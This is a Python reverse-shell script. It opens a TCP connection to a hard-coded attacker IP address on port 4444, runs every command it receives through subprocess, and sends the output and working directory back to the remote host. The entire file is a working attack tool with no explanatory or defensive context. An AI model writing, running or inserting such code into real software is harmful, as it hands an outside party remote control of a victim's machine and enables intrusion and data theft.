import socket
import subprocess
import os

# Replace the following values with your attacker machine's IP address and port
ATTACKER_IP = '34.230.74.250'
ATTACKER_PORT = 4444

def connect():
    # Create a socket object
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # Connect to the attacker machine
        s.connect((ATTACKER_IP, ATTACKER_PORT))
    except ConnectionRefusedError:
        return

    # Receive the initial command prompt from the attacker
    prompt = s.recv(1024).decode()

    while True:
        # Receive the command from the attacker
        command = s.recv(1024).decode()

        if command.startswith('exit'):
            break

        # Execute the command and retrieve the output
        output = subprocess.getoutput(command)

        # Send the output back to the attacker
        s.send(output.encode())

        # Change the current working directory based on the attacker's command
        try:
            os.chdir(command.strip())
        except FileNotFoundError:
            pass

        # Send the updated current working directory to the attacker
        cwd = os.getcwd()
        s.send(('Directory: ' + cwd + '> ').encode())

    # Close the connection
    s.close()

# Connect to the attacker machine and establish the interactive reverse shell
connect()
